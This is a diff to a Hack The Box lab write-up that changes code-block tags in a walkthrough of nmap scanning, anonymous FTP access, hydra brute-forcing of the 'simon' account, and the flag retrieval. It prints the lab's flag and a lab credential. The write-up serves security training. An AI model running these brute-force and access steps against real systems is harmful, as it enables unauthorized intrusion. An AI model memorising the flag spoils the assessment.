@@ -4,7 +4,7 @@ The second server is an internal server (within the inlanefreight.htb domain) th
 > Task: Assess the target server and find the flag.txt file. Submit the contents of this file as your answer.. **Answer: HTB{1qay2wsx3EDC4rfv_M3D1UM}**
 
 1. Enumerate the target with full port scan:
-    ```sh
+    ```shellsession
     $ nmap -Pn -sV -p- 10.129.36.136
     Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-11 03:07 CST
     Nmap scan report for 10.129.36.136
@@ -20,7 +20,7 @@ The second server is an internal server (within the inlanefreight.htb domain) th
     ```
 
 2. Tries login as anonymous to the FTP service at port 30021 and found interesting notes:
-    ```sh
+    ```shellsession
     $ ftp 10.129.36.136 30021
     Connected to 10.129.36.136.
     220 ProFTPD Server (Internal FTP) [10.129.36.136]
@@ -47,7 +47,7 @@ The second server is an internal server (within the inlanefreight.htb domain) th
     ```
 
 3. This note might be the passwords for the `simon` account:
-    ```sh
+    ```shellsession
     $ cat mynotes.txt 
     234987123948729384293
     +23358093845098
@@ -60,7 +60,7 @@ The second server is an internal server (within the inlanefreight.htb domain) th
     ```
 
 4. Brute-force the `simon` account with the retrieved password list and retrieve credential for the FTP service at port 2121 (`simon:8Ns8j1b!23hs4921smHzwn`):
-    ```sh
+    ```shellsession
     $ hydra -l simon -P mynotes.txt -s 2121 ftp://10.129.36.136
     Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -73,7 +73,7 @@ The second server is an internal server (within the inlanefreight.htb domain) th
     ```
 
 5. Login with the retrieved credential and read the flag:
-    ```sh
+    ```shellsession
     $ ftp 10.129.36.136 2121
     Connected to 10.129.36.136.
     220 ProFTPD Server (InlaneFTP) [10.129.36.136]
